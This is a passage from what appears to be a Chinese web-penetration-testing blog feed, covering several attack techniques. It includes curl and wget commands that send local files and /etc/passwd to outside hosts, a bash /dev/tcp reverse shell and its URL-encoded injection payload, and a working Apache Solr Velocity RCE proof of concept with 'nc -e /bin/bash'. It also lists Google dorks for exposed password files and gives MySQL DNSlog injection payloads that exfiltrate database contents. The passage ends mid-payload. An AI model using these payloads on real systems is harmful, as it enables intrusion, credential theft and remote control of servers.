target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpDTs.jpg" alt="MZpDTs.jpg"></a></p></li></ul><h2><span id="0x01-curl上传文件">0X01 curl上传文件</span></h2><ul><li><p>我们可以用 -X POST 来申明我们的请求方法，用 -F “file=@<strong>FILE_PATH</strong>“ 的请示，传输文件即可。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 利用Burp：</span><br><span class="line">curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://a8jmrauzh2kxy56bhk99xwhh78dy1n.burpcollaborator.net -v</span><br><span class="line"></span><br><span class="line"># 利用NC：</span><br><span class="line">curl -X POST -F xx=@/Users/vk/Downloads/1.txt http://127.0.0.1:9999 -v</span><br></pre></td></tr></table></figure></li><li><p>打开Burp主界面 –&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard<br>  <a href="https://imgchr.com/i/MZp2lT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZp2lT.jpg" alt="MZp2lT.jpg"></a><br>  <a href="https://imgchr.com/i/MZpR6U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpR6U.jpg" alt="MZpR6U.jpg"></a></p></li></ul><h2><span id="0x02-wget">0X02 Wget</span></h2><ul><li><p>wget指定header头查看日志回显</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -d --header=&quot;User-Agent: $(cat /etc/passwd|tail -n 1)&quot; http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MuAZ4O" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MuAZ4O.jpg" alt="MuAZ4O.jpg"></a><br>  <a href="https://imgchr.com/i/MuAVUK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MuAVUK.jpg" alt="MuAVUK.jpg"></a></p></li></ul><h2><span id="0x03-反弹shell">0X03 反弹shell</span></h2><ul><li><p>用nc返回一个交互式的shell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 服务器端执行</span><br><span class="line">nc -vv -lp 8888</span><br><span class="line"></span><br><span class="line"># 命令执行处执行</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"># payload</span><br><span class="line">command=111%0d%0abash+-i+&gt;%26+/dev/tcp/127.0.0.1/8888+0&gt;%261</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MZpyYq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpyYq.jpg" alt="MZpyYq.jpg"></a><br>  <a href="https://imgchr.com/i/MZpskn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZpskn.jpg" alt="MZpskn.jpg"></a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-dnslog回显&quot;&gt;0X00 DNSLOG回显&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-curl上传文件&quot;&gt;0X01 curl上传文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Apache_Solr_Velocity模板注入RCE漏洞</title>
    <link href="http://www.vkxss.top/2019/10/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Apache_Solr_Velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.vkxss.top/2019/10/31/渗透测试-Apache_Solr_Velocity模板注入RCE漏洞/</id>
    <published>2019-10-31T07:30:08.000Z</published>
    <updated>2019-11-01T03:31:26.517Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-前言">0x00 前言</a></li><li><a href="#0x01-漏洞详情">0x01 漏洞详情</a></li><li><a href="#0x02-poc">0x02 POC</a></li><li><a href="#0x03-复现">0x03 复现</a></li></ul><!-- tocstop --><h2><span id="0x00-前言">0x00 前言</span></h2><ul><li><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p></li><li><p>r是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p></li></ul><h2><span id="0x01-漏洞详情">0x01 漏洞详情</span></h2><ul><li>该漏洞的产生原因：<ul><li>1、攻击者可以直接访问solr admin页面,并可以通过构造post请求来修改节点的配置.</li><li>2.Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。</li><li>3、当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的请求，在服务器上进行命令执行,从而获取服务器的权限。</li></ul></li></ul><h2><span id="0x02-poc">0x02 POC</span></h2><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">来自：https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt </span><br><span class="line"></span><br><span class="line">Apache Solr RCE via Velocity template</span><br><span class="line"></span><br><span class="line">Set &quot;params.resource.loader.enabled&quot; as true.</span><br><span class="line"></span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">POST /solr/test/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE via velocity template</span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line">========================================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)</span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure></code></pre><h2><span id="0x03-复现">0x03 复现</span></h2><ul><li><p>环境搭建</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载最新的Solr</span><br><span class="line">下载地址:https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">解压以后,进入solr-8.2.0/bin目录</span><br><span class="line">使用./solr -e dih -force开启示例app</span><br></pre></td></tr></table></figure><p> <a href="https://imgchr.com/i/K7nKL4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nKL4.md.jpg" alt="K7nKL4.md.jpg"></a></p></li><li><p>payload:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br><span class="line">注意：漏洞需要Content-Type为application/json</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/K7nuyF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nuyF.md.jpg" alt="K7nuyF.md.jpg"></a></p></li><li><p>反弹shell：</p><ul><li>可以反弹shell，使用nc命令：<br><a href="https://imgchr.com/i/K7nnQU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nnQU.md.jpg" alt="K7nnQU.md.jpg"></a></li></ul><ul><li>nc -e /bin/bash ip port成功反弹shell<br><a href="https://imgchr.com/i/K7nezT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/01/K7nezT.md.jpg" alt="K7nezT.md.jpg"></a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-前言&quot;&gt;0x00 前言&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-漏洞详情&quot;&gt;0x01 漏洞详情&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-poc&quot;&gt;0x02 POC&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-11043-PHP远程代码执行漏洞复现</title>
    <link href="http://www.vkxss.top/2019/10/25/CVE-2019-11043/"/>
    <id>http://www.vkxss.top/2019/10/25/CVE-2019-11043/</id>
    <published>2019-10-25T07:30:08.000Z</published>
    <updated>2019-11-01T05:22:25.327Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞复现">0X04 漏洞复现</a></li><li><a href="#0x05-漏洞总结">0X05 漏洞总结</a></li><li><a href="#0x06-reference">0X06 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li>9 月 26 日，安全研究员 Andrew Danau向PHP 提交一枚远程代码执行漏洞，使用某些特定配置的Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。该漏洞EXP于10月22日公开。<br>原因是：Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。</li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li>CVE-2019-11043</li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li><p>Nginx+ php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">        fastcgi_split_path_info^(.+?\.php)(/.*)$;</span><br><span class="line">        fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">        fastcgi_pass   php:9000;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x04-漏洞复现">0X04 漏洞复现</span></h2><ul><li><p>在EXP公布的时候，vulhub也发布了相应的镜像，本次实验使用该镜像进行复现。</p><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043</a></li></ul></li><li><p>将文件下载下来之后，搭建环境:</p><ul><li>docker-compose up -d</li></ul></li><li><p>Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。<br><img src="https://s2.ax1x.com/2019/11/01/K7rsNn.jpg" alt="K7rsNn.jpg"></p></li><li><p>详情参考Reference</p></li></ul><h2><span id="0x05-漏洞总结">0X05 漏洞总结</span></h2><ul><li>利用条件苛刻，因为触发漏洞的配置不是默认配置。</li><li>即使是触发漏洞的配置，仍有失败的机率，执行命令时成功率50%的样子。</li></ul><h2><span id="0x06-reference">0X06 Reference</span></h2><ul><li>参考链接：<a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16759" scheme="http://www.vkxss.top/tags/CVE-2019-16759/"/>
    
  </entry>
  
  <entry>
    <title>google_hack语法</title>
    <link href="http://www.vkxss.top/2019/10/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-google_hack%E8%AF%AD%E6%B3%95/"/>
    <id>http://www.vkxss.top/2019/10/24/渗透测试-google_hack语法/</id>
    <published>2019-10-24T04:25:40.000Z</published>
    <updated>2019-12-12T07:58:26.878Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="google-hack语法">google hack语法</span></h2><hr><p><b>简介</b><br>在日站的时候google搜索能让我们获得意想不到的信息，可以找到目标站点的敏感信息。后台等等</p><hr><p><b>google hack语法列表</b><br>初级语法表</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">模糊搜索-例如：卢本伟</span><br><span class="line">精确搜索-例如：<span class="string">"卢本伟"</span></span><br><span class="line">通配符*-例如：何安圻*</span><br><span class="line">通配符.-例如：大岭山中学.   PS:.的通配符用于匹配字符</span><br><span class="line">布尔逻辑-例如：大岭山中学 and 何安圻</span><br><span class="line">逻辑或|-例如：绿盟 (郑州)</span><br><span class="line">逻辑非-例如：何安圻 -博客园</span><br><span class="line">约束条件-例如：黎颖希 +获奖</span><br><span class="line">数字范围-例如：绿盟+<span class="number">2009</span>年 <span class="number">2015</span>年</span><br></pre></td></tr></table></figure><p>高级语法表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问基本信息-例如：info:baidu.com</span><br><span class="line">标题搜索-例如：intitle:后台登录</span><br><span class="line">正文搜索-例如：intext:身份证大全</span><br><span class="line">url搜索-例如：inurl:google.com</span><br><span class="line">锚链链接搜索-例如：inanchor:google</span><br><span class="line">文档类型限定搜索-例如：intext:身份证大全 filetype:xls</span><br><span class="line">缓存搜索-l例如：cache:secqun.org</span><br><span class="line">相关网址搜索-例如：related:google hacking</span><br><span class="line">相关连接搜索-例如：link:baidu.com</span><br><span class="line">与指定域名相关的搜索：site:baidu.com</span><br></pre></td></tr></table></figure><p>高级利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">inurl:robots.txt</span><br><span class="line">intitle:登录 intext:username inurl:login.jsp</span><br><span class="line">inurl:<span class="number">8080</span> inurl:jsp</span><br><span class="line">filetype:sql site:com <span class="keyword">and</span> <span class="string">"insert into admin 2014"</span></span><br><span class="line">inurl:jsp/demo.jsp</span><br><span class="line">inurl:update <span class="built_in">set</span> inurl:where</span><br></pre></td></tr></table></figure><p>渗透利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">“Login: ” “password =” filetype: xls ( 搜索存储在excel文件中含有password的数据)。</span><br><span class="line">allinurl: auth_user_file.txt (搜索包含在服务器上的 auth_user_file.txt 的文件）。</span><br><span class="line">filetype: xls inurl: “password.xls” (查找 用户名和密码以excel格式）这个命令可以变为“admin.xls”.</span><br><span class="line">intitle: login password (获取登陆页面的连接，登陆关键词在标题中。)</span><br><span class="line">intitle: “Index of” master.passwd (密码页面索引)</span><br><span class="line">index of / backup ( 搜索服务器上的备份文件）</span><br><span class="line">intitle: index.of people.lst (包含people.list的网页）</span><br><span class="line">intitle: index.of passwd.bak ( 密码备份文件)</span><br><span class="line">intitle: “Index of” pwd.db (搜索数据库密码文件).</span><br><span class="line">intitle: “Index of .. etc” passwd (安装密码建立页面索引）.</span><br><span class="line">index.of passlist.txt (以纯文本的形式加载包含passlist.txt的页面).</span><br><span class="line">index.of.secret (显示包含机密的文档，.gov类型的网站除外) 还可以使用: index.of.private</span><br><span class="line">filetype: xls username password email (查找表格中含有username和password的列的xls文件).</span><br><span class="line">”# PhpMyAdmin MySQL-Dump” filetype: txt (列出包含敏感数据的基于php的页面)</span><br><span class="line">inurl: ipsec.secrets-history-bugs (包含只有超级用户才有的敏感数据). 还有一种旧的用法 inurl: ipsec.secrets “holds shared secrets”</span><br><span class="line">inurl: ipsec.conf-intitle: manpage</span><br><span class="line">inurl: “wvdial.conf” intext: “password” (显示包含电话号码，用户名和密码的连接。）</span><br><span class="line">inurl: “user.xls” intext: “password” (显示用户名和密码存储在xls的链接。)</span><br><span class="line">filetype: ldb admin (web服务器查找存储在数据库中没有呗googledork删去的密码。）</span><br><span class="line">inurl: search / admin.php (查找admin登陆的php页面). 如果幸运的话，还可以找到一个管理员配置界面创建一个新用户。</span><br><span class="line">inurl: password.log filetype:log (查找特定链接的日志文件。)</span><br><span class="line">filetype: reg HKEY_CURRENT_USER username (在HCU (Hkey_Current_User)路径中查找注册表文件(registyry)。)</span><br><span class="line">“Http://username: password @ www …” filetype: bak inurl: “htaccess | passwd | shadow | ht users”(查找备份文件中的用户名和密码。)</span><br><span class="line">filetype:ini ws_ftp pwd (通过ws_ftp.ini 文件查找admin用户的密码)</span><br><span class="line">intitle: “Index of” pwd.db (查找加密的用户名和密码）</span><br><span class="line">inurl:admin inurl:backup intitle:index.of (查找关键词包含admin和backup的目录。)</span><br><span class="line">“Index of/” “Parent Directory” “WS _ FTP.ini” filetype:ini WS _ FTP PWD (WS_FTP 配置文件， 可以获取FTP服务器的进入权限)</span><br><span class="line">ext:pwd inurl:(service|authors|administrators|users) “# -FrontPage-”</span><br><span class="line">filetype: sql ( “passwd values *” |” password values *” | “pass values **“) 查找存储在数据库中的sql代码和密码。 )</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;google-hack语法&quot;&gt;google hack语法&lt;/span&gt;&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&lt;b&gt;简介&lt;/b&gt;&lt;br&gt;在日站的时候google搜索能让我们获得意想不到的信息，可以找到目标站点的敏感信息。后台等等&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;b&gt;goo
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-Dnslog盲注</title>
    <link href="http://www.vkxss.top/2019/10/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Mysql-Dnslog%E7%9B%B2%E6%B3%A8/"/>
    <id>http://www.vkxss.top/2019/10/21/渗透测试-Mysql-Dnslog盲注/</id>
    <published>2019-10-21T06:25:40.000Z</published>
    <updated>2019-10-21T17:01:56.359Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</a></li><li><a href="#0x01-利用条件">0x01 利用条件</a></li><li><a href="#0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</a></li><li><a href="#0x03-构造攻击payload">0x03 构造攻击Payload</a></li><li><a href="#0x04-reference">0X04 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</span></h2><ul><li>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。<br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt></li></ul><h2><span id="0x01-利用条件">0x01 利用条件</span></h2><ul><li><p>数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限</p></li><li><p>其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL</p><ul><li>secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</li></ul></li></ul><h2><span id="0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</span></h2><ul><li><p>在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。</p></li><li><p>使用如下命令查看：</p><ul><li><p>mysql&gt;show global variables like ‘%secure%’;</p></li><li><p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。</p><ul><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。<br><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt></li></ul></li></ul></li></ul><ul><li><p>总结下如何修改secure_file_priv的值？</p><ul><li><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</p></li><li><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p></li><li><p>MYSQL新特性secure_file_priv对读写文件的影响</p></li><li><p>然后重启mysql，再查询secure_file_priv</p><p>  <img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt></p></li></ul></li></ul><h2><span id="0x03-构造攻击payload">0x03 构造攻击Payload</span></h2><ul><li><p>普通payload：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br><span class="line">concat是字符串拼接；</span><br><span class="line">用4个,因为\\会被转义为:\</span><br><span class="line">database()就是你要做SQL注入查询的地方</span><br><span class="line">&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</span><br><span class="line">unc路径 网络共享文件方式 \\dnslog\abc这样的路径</span><br></pre></td></tr></table></figure></li></ul><pre><code>- 上面拼接的结果就是&quot;\\\\ schema_name.dnslog\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。</code></pre><ul><li><p>加密payload</p><ul><li><p>利用bur or select hex(“要加密的数据”)即可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加密前：</span><br><span class="line">    select load_file(concat(&quot;\\\\&quot;,version(),&quot;.dnslog\\abc&quot;));</span><br><span class="line">16进制加密后：</span><br><span class="line">    select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/K1Xd56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1Xd56.png" alt="K1Xd56.png"></a></p><p><a href="https://imgchr.com/i/K1XaUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1XaUx.png" alt="K1XaUx.png"></a></p></li></ul></li><li><p>读配置文件payload</p><ul><li><p>这里构造下payload读取：C:\phpStudy\WWW\phpinfo.php</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">首先</span><br><span class="line">select hex(&apos;C:\\phpStudy\\WWW\\phpinfo.php&apos;)</span><br><span class="line">得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870</span><br><span class="line"></span><br><span class="line">然后构造下payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。</span><br><span class="line"></span><br><span class="line">但是你觉得会成功吗 no no no</span><br><span class="line"></span><br><span class="line">因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯</span><br><span class="line">用hex() 继续构造payload:</span><br><span 